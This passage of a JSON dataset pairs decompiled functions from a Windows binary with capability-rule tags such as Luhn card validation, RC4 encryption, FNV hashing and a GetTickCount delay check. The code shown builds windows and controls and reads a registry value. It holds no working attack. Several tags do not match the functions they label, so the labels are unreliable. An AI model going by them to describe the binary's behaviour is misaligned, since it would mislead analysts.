        "decompiled_code": "\nuint32_t __cdecl fcn.004050b9(uint arg_8h, uint arg_ch, uint arg_10h, uchar *arg_14h, uint32_t arg_18h)\n\n{\n    int32_t iVar1;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    *arg_14h = 0;\n    iVar1 = func_0x00409934(arg_8h, arg_ch, 0, 0x20019, &var_4h);\n    if (iVar1 == 0) {\n        iVar1 = func_0x00409940(var_4h, arg_10h, 0, 0, arg_14h, &arg_18h);\n        if (iVar1 == 0) {\n            func_0x00409928(var_4h);\n            arg_18h = arg_18h & 0xffff;\n        }\n        else {\n            func_0x00409928(var_4h);\n            arg_18h = 0;\n        }\n    }\n    else {\n        arg_18h = 0;\n    }\n    return arg_18h;\n}\n",
        "token_count": 257
    },
    "00406481": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406481(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_1f48h;\n    uint var_1f44h;\n    uint var_1f40h;\n    uint var_1f3ch;\n    uint var_1f38h;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    int32_t iStack40;\n    uint *puStack36;\n    uint *puStack32;\n    uint uStack28;\n    uint *puStack24;\n    uint *puStack20;\n    \n    func_0x00409528();\n    var_1f44h = 8000;\n    puStack20 = &fcn.00406481::var_1f44h;\n    puStack24 = &fcn.00406481::var_1f40h;\n    uStack28 = 0x42dc66;\n    puStack32 = 0x4064c7;\n    iVar1 = func_0x004094ac();\n    if (iVar1 != 0) {\n        puStack32 = arg_8h;\n        puStack36 = var_1f3ch;\n        iStack40 = 0x4064e3;\n        iVar2 = func_0x00409994();\n        if (iVar2 == 0) {\n            puStack32 = var_1f38h;\n            puStack36 = arg_ch;\n            iStack40 = 0x4064f8;\n            func_0x00409548();\n            iVar1 = 1;\n        }\n        else {\n            do {\n                var_1f44h = 8000;\n                puStack32 = &fcn.00406481::var_1f44h;\n                puStack36 = &fcn.00406481::var_1f40h;\n                uStack44 = 0x40652a;\n                iStack40 = iVar1;\n                iVar2 = func_0x004094b8();\n                if (iVar2 == 0) {\n                    return 0;\n                }\n                uStack44 = arg_8h;\n                uStack48 = var_1f3ch;\n                uStack52 = 0x406540;\n                iVar2 = func_0x00409994();\n            } while (iVar2 != 0);\n            puStack32 = var_1f38h;\n            puStack36 = arg_ch;\n            iStack40 = 0x406555;\n            func_0x00409548();\n            iVar1 = 1;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 575
    },
    "00406e93": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406e93(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_1004h;\n    uint var_fffh;\n    uint uStackY48;\n    \n    func_0x00409528();\n    iVar1 = func_0x004097a8();\n    while( true ) {\n        if (iVar1 == 0) {\n            return 0;\n        }\n        func_0x004097b4();\n        uStackY48 = 0x406ef3;\n        iVar2 = fcn.0040203b(&fcn.00406e93::var_fffh, arg_ch, 1);\n        if (iVar2 != 0xffff) break;\n        iVar1 = func_0x004097a8();\n    }\n    return iVar1;\n}\n",
        "token_count": 192
    },
    "00406f17": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00406f17(void)\n\n{\n    uint var_ch;\n    uint var_2h;\n    \n    for (var_2h._0_2_ = 1; var_2h < 0xd; var_2h._0_2_ = var_2h + 1) {\n        func_0x00409a00(&var_ch, 0x42dc06, var_2h);\n        func_0x00409874(*0x42a180, 0x143, 0, &var_ch);\n        func_0x00409a00(&var_ch, 0x42dbff, var_2h + 3);\n        func_0x00409874(*0x419f2c, 0x143, 0, &var_ch);\n    }\n    return;\n}\n",
        "token_count": 209
    },
    "00406fa5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00406fa5(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = func_0x00409904(0x10, 6, 0, 0, 400, 0, 0, 0, 1, 5, 0, 0, 2, 0);\n    func_0x00409874(*0x42a184, 0x30, uVar1, 1);\n    func_0x00409874(*0x419de8, 0x30, uVar1, 1);\n    func_0x00409874(*0x42a180, 0x30, uVar1, 1);\n    func_0x00409874(*0x419f2c, 0x30, uVar1, 1);\n    func_0x00409874(*0x40951c, 0x30, uVar1, 1);\n    func_0x00409874(*0x419f28, 0x30, uVar1, 1);\n    func_0x00409874(*0x419f20, 0x30, uVar1, 1);\n    func_0x00409874(*0x42a390, 0x30, uVar1, 1);\n    func_0x00409874(*0x42a174, 0x30, uVar1, 1);\n    func_0x00409874(*0x419930, 0x30, uVar1, 1);\n    func_0x00409874(*0x419df0, 0x30, uVar1, 1);\n    func_0x00409874(*0x42a394, 0x30, uVar1, 1);\n    func_0x00409874(*0x42a398, 0x30, uVar1, 1);\n    return 0;\n}\n",
        "token_count": 432
    },
    "004070c3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\nvoid fcn.004070c3(void)\n\n{\n    uint var_4h;\n    \n    *0x409520 = func_0x00409820(*0x419de8, 0xfffffffc);\n    func_0x0040982c(*0x419de8, 0xfffffffc, 0x4086de);\n    *0x419f3c = func_0x00409820(*0x42a180, 0xfffffffc);\n    func_0x0040982c(*0x42a180, 0xfffffffc, 0x4086de);\n    *0x419f24 = func_0x00409820(*0x419f2c, 0xfffffffc);\n    func_0x0040982c(*0x419f2c, 0xfffffffc, 0x4086de);\n    *0x409000 = func_0x00409820(*0x40951c, 0xfffffffc);\n    func_0x0040982c(*0x40951c, 0xfffffffc, 0x4086de);\n    *0x42a178 = func_0x00409820(*0x419f28, 0xfffffffc);\n    func_0x0040982c(*0x419f28, 0xfffffffc, 0x4086de);\n    *0x40992c = func_0x00409820(*0x419f20, 0xfffffffc);\n    func_0x0040982c(*0x419f20, 0xfffffffc, 0x4086de);\n    *0x419f1c = func_0x00409820(*0x42a184, 0xfffffffc);\n    func_0x0040982c(*0x42a184, 0xfffffffc, 0x4086de);\n    return;\n}\n",
        "token_count": 411
    },
    "004071e1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004071e1(uint arg_8h)\n\n{\n    uint uVar1;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar1 = fcn.00406e93(arg_8h, 0x42dbf5);\n    *0x419f08 = fcn.00406e93(uVar1, 0x42dbec);\n    func_0x0040988c(*0x419f08, 0);\n    func_0x00409790(uVar1, &var_10h);\n    *0x41a044 = func_0x00409898(0x200, 0x42dbe1, 0x42dfdc, 0x50800000, 0, 0, var_8h - var_10h, var_4h - var_ch, uVar1, 0\n                                , *0x419f34, 0);\n    *0x419f04 = func_0x00409898(0, 0x42dbda, 0x42dbc4, 0x50800000, 0x14, 0x14, (var_8h - var_10h) + -100, 0x3c, \n                                *0x41a044, 0, *0x419f34, 0);\n    *0x42a060 = func_0x00409898(0, 0x42dbda, 0x42dfdc, 0x50800009, 0x14, 0x51, (var_8h - var_10h) + -100, 400, *0x41a044\n                                , 0, *0x419f34, 0);\n    uVar1 = func_0x00409904(0x14, 8, 0, 0, 700, 0, 0, 0, 1, 5, 0, 0, 2, 0);\n    func_0x00409874(*0x419f04, 0x30, uVar1, 1);\n    *0x42a17c = func_0x00409898(0, 0x42dbda, 0x42db6c, 0x50000000, 0x28, 100, 0x236, 0x10, *0x41a044, 0, *0x419f34, 0);\n    *0x42a3a0 = func_0x00409898(0, 0x42dbda, 0x42db18, 0x50000000, 0x28, 0x78, 0x223, 0x10, *0x41a044, 0, *0x419f34, 0);\n    *0x419f0c = func_0x00409898(0, 0x42dbda, 0x42dace, 0x50000000, 0x28, 0xa0, 0x1d1, 0x10, *0x41a044, 0, *0x419f34, 0);\n    *0x419f14 = func_0x00409898(0, 0x42dbda, 0x42da8e, 0x50000000, 0x28, 0xbe, 0x178, 0x10, *0x41a044, 0, *0x419f34, 0);\n    *0x419de8 = func_0x00409898(0, 0x42da85, 0x42dfdc, 0x50800003, 0x14, 0xaa, 100, 100, *0x42a060, 0, *0x419f34, 0);\n    func_0x00409874(*0x419de8, 0x143, 0, 0x42da7a);\n    func_0x00409874(*0x419de8, 0x143, 0, 0x42da75);\n    *0x42a180 = func_0x00409898(0, 0x42da85, 0x42dfdc, 0x50800003, 0x7a, 0xaa, 0x32, 300, *0x42a060, 0, *0x419f34, 0);\n    *0x419f2c = func_0x00409898(0, 0x42da85, 0x42dfdc, 0x50800003, 0xae, 0xaa, 0x3c, 300, *0x42a060, 0, *0x419f34, 0);\n    fcn.00406f17();\n    *0x42a390 = func_0x00409898(0, 0x42dbda, 0x42da6b, 0x50000000, 0x168, 0xe6, 0x3b, 0x10, *0x41a044, 0, *0x419f34, 0);\n    *0x42a174 = func_0x00409898(0, 0x42dbda, 0x42da53, 0x50000000, 0x114, 0xff, 0x81, 0x10, *0x41a044, 0, *0x419f34, 0);\n    *0x419930 = func_0x00409898(0, 0x42dbda, 0x42da42, 0x50000000, 0xc3, 0x118, 0x67, 0x10, *0x41a044, 0, *0x419f34, 0);\n    *0x419df0 = func_0x00409898(0, 0x42dbda, 0x42da13, 0x50000000, 100, 0x131, 0xfd, 0x10, *0x41a044, 0, *0x419f34, 0);\n    *0x42a394 = func_0x00409898(0, 0x42dbda, 0x42da06, 0x50000000, 0xa0, 0x14a, 0x56, 0x10, *0x41a044, 0, *0x419f34, 0);\n    *0x42a184 = func_0x00409898(0x200, 0x42da01, 0x42dfdc, 0x50800000, 0x14, 0x91, 300, 0x18, *0x42a060, 0, *0x419f34, 0\n                               );\n    *0x40951c = func_0x00409898(0x200, 0x42da01, 0x42a290, 0x50800000, 0x14, 0xc3, 0x82, 0x18, *0x42a060, 0, *0x419f34, \n                                0);\n    *0x419f28 = func_0x00409898(0x200, 0x42da01, 0x42dfdc, 0x50800000, 0x14, 0xdc, 0x28, 0x18, *0x42a060, 0, *0x419f34, \n                                0);\n    *0x419f20 = func_0x00409898(0x200, 0x42da01, 0x42dfdc, 0x50800000, 0x14, 0xf5, 100, 0x18, *0x42a060, 0, *0x419f34, 0\n                               );\n    *0x42a398 = func_0x00409898(0, 0x42d9fa, 0x42d9e3, 0x50800000, 0x1e, 0x1a9, 0x9b, 0x17, *0x41a044, 0, *0x419f34, 0);\n    fcn.00406fa5();\n    fcn.004070c3();\n    return;\n}\n",
        "token_count": 1949
    },
    "00407751": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407751(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar1 = fcn.00406e93(arg_8h, 0x42dbf5);\n    *0x419f08 = fcn.00406e93(uVar1, 0x42dbec);\n    func_0x0040988c(*0x419f08, 0);\n    func_0x00409790(uVar1, &var_10h);\n    *0x41a044 = func_0x00409898(0x200, 0x42dbe1, 0x42dfdc, 0x50800000, 0, 0, var_8h - var_10h, var_4h - var_ch, uVar1, 0\n                                , *0x419f34, 0);\n    *0x419f04 = func_0x00409898(0, 0x42dbda, 0x42d9c9, 0x50800000, 0x14, 0x14, (var_8h - var_10h) + -100, 0x3c, \n                                *0x41a044, 0, *0x419f34, 0);\n    *0x42a060 = func_0x00409898(0, 0x42dbda, 0x42dfdc, 0x50800009, 0x14, 0x51, (var_8h - var_10h) + -100, 300, *0x41a044\n                                , 0, *0x419f34, 0);\n    uVar1 = func_0x00409904(0x14, 8, 0, 0, 700, 0, 0, 0, 1, 5, 0, 0, 2, 0);\n    func_0x00409874(*0x419f04, 0x30, uVar1, 1);\n    *0x419de8 = func_0x00409898(0, 0x42da85, 0x42dfdc, 0x50800003, 0x14, 0x14, 100, 100, *0x42a060, 0, *0x419f34, 0);\n    func_0x00409874(*0x419de8, 0x143, 0, 0x42da7a);\n    func_0x00409874(*0x419de8, 0x143, 0, 0x42da75);\n    if (*0x42a290 == '4') {\n        func_0x00409874(*0x419de8, 0x14e, 1, 0);\n    }\n    else {\n        func_0x00409874(*0x419de8, 0x14e, 0, 0);\n    }\n    *0x42a180 = func_0x00409898(0, 0x42da85, 0x42dfdc, 0x50800003, 0x7a, 0x14, 0x32, 300, *0x42a060, 0, *0x419f34, 0);\n    *0x419f2c = func_0x00409898(0, 0x42da85, 0x42dfdc, 0x50800003, 0xae, 0x14, 0x3c, 300, *0x42a060, 0, *0x419f34, 0);\n    fcn.00406f17();\n    *0x42a174 = func_0x00409898(0, 0x42dbda, 0x42da53, 0x50000000, 0x114, 0x6e, 0x81, 0x10, *0x41a044, 0, *0x419f34, 0);\n    *0x419930 = func_0x00409898(0, 0x42dbda, 0x42da42, 0x50000000, 0xc3, 0x87, 0x67, 0x10, *0x41a044, 0, *0x419f34, 0);\n    *0x419df0 = func_0x00409898(0, 0x42dbda, 0x42da13, 0x50000000, 100, 0xa0, 0xfd, 0x10, *0x41a044, 0, *0x419f34, 0);\n    *0x42a394 = func_0x00409898(0, 0x42dbda, 0x42da06, 0x50000000, 0xa0, 0xb9, 0x56, 0x10, *0x41a044, 0, *0x419f34, 0);\n    *0x42a17c = func_0x00409898(0, 0x42dbda, 0x42d97e, 0x50000000, 0x1e, 0xe6, 0x1e4, 0x10, *0x41a044, 0, *0x419f34, 0);\n    *0x42a3a0 = func_0x00409898(0, 0x42dbda, 0x42d957, 0x50000000, 0x1e, 0xff, 0xfd, 0x10, *0x41a044, 0, *0x419f34, 0);\n    *0x40951c = func_0x00409898(0x200, 0x42da01, 0x42a290, 0x50800000, 0x14, 0x2d, 0x82, 0x18, *0x42a060, 0, *0x419f34, \n                                0);\n    *0x419f28 = func_0x00409898(0x200, 0x42da01, 0x42dfdc, 0x50800000, 0x14, 0x46, 0x28, 0x18, *0x42a060, 0, *0x419f34, \n                                0);\n    *0x419f20 = func_0x00409898(0x200, 0x42da01, 0x42dfdc, 0x50800000, 0x14, 0x5f, 100, 0x18, *0x42a060, 0, *0x419f34, 0\n                               );\n    *0x42a398 = func_0x00409898(0, 0x42d9fa, 0x42d9e3, 0x50800000, 0x1e, 0x140, 0x9b, 0x17, *0x41a044, 0, *0x419f34, 0);\n    fcn.00406fa5();\n    fcn.004070c3();\n    return;\n}\n",
        "token_count": 1703
    },
    "00407ebe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407ebe(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = func_0x00409754(arg_8h);\n    iVar1 = fcn.00406de6(arg_8h + 1 + iVar1, arg_8h);\n    if (iVar1 != 0) {\n        func_0x0040973c(arg_8h, 0);\n    }\n    return;\n}\n",
        "token_count": 104
    }
}